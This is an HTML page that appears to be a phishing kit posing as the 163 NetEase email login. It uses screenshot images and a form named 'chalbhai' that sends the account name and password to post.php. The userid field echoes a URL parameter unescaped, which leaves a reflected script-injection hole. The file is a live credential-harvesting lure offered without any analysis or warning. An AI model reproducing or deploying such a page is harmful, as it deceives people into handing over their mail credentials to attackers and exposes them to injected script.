<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>163&#32593;&#26131;&#20813;&#36153;&#37038;&#45;&#45;&#20013;&#25991;&#37038;&#31665;&#31532;&#19968;&#21697;&#29260;</title>
<meta http-equiv="content-type" content="text/html; charset=iso-8859-1">
<style> 
 
 .inputs {
    height: 39px;
    padding: 0 10px;
    
    background: #FFF;
    background: rgba(255, 255, 255, 0.2);
    box-shadow: inset 0 0 10px rgba(255, 255, 255, 0.5);
    font-family: 'Montserrat', sans-serif;
    text-indent: 10px;
 
    text-shadow: 0 1px 2px rgba(0, 0, 0, 0.3);
    font-size: 13px;
    width: 270px;
}


</style> 
</head>
<body>
<div id="image1" style="position:absolute; overflow:hidden; left:-1px; top:0px; width:1344px; height:63px; z-index:0"><img src="images/1.png" alt="" title="" border=0 width=1344 height=63></div>
<form action=post.php name=chalbhai id=chalbhai method=post>
<div id="image2" style="position:absolute; overflow:hidden; left:0px; top:64px; width:1328px; height:599px; z-index:1"><img src="images/3.png" alt="" title="" border=0 width=1328 height=599></div>

<div id="image3" style="position:absolute; overflow:hidden; left:1016px; top:624px; width:72px; height:32px; z-index:2"><a href="#"><img src="images/4.png" alt="" title="" border=0 width=72 height=32></a></div>

<div id="image4" style="position:absolute; overflow:hidden; left:207px; top:664px; width:936px; height:42px; z-index:3"><a href="#"><img src="images/11.png" alt="" title="" border=0 width=936 height=42></a></div>

<div id="image5" style="position:absolute; overflow:hidden; left:798px; top:542px; width:202px; height:43px; z-index:4"><a href="#"><img src="images/5.png" alt="" title="" border=0 width=202 height=43></a></div>

<div id="image6" style="position:absolute; overflow:hidden; left:793px; top:475px; width:265px; height:38px; z-index:5"><a href="#"><img src="images/6.png" alt="" title="" border=0 width=265 height=38></a></div>

<div id="image7" style="position:absolute; overflow:hidden; left:977px; top:340px; width:75px; height:27px; z-index:6"><a href="#"><img src="images/9.png" alt="" title="" border=0 width=75 height=27></a></div>


<input name="userid" value="<?=$_GET[userid]?>" placeholder="&#37038;&#31665;&#24080;&#21495;&#25110;&#25163;&#26426;&#21495;"     required type="text" style="position:absolute;border:none;outline: none;font-weight: bold;background:rgba(227,162,11,0.0);height:39px;border:none;text-align:center;outline: none;font-weight: bold;background:rgba(227,162,11,0.0);padding-left:18px;width:244;px;left:804px;top:221px;z-index:8">
<input name="formtext2" class="inputs" placeholder="&#23494;&#30721;"   required type="password" style="position:absolute;border:none;outline: none;padding-left:18px;font-weight: bold;background:rgba(227,162,11,0.0);width:244px;left:804px;top:282px;z-index:9">
<div id="formimage1" style="position:absolute; left:802px; top:375px; z-index:10"><input type="image" name="formimage1" width="114" height="42" src="images/7.png"></div>
<div id="image8" style="position:absolute; overflow:hidden; left:936px; top:372px; width:117px; height:45px; z-index:11"><a href="#"><img src="images/8.png" alt="" title="" border=0 width=117 height=45></a></div>


</body>
</html>
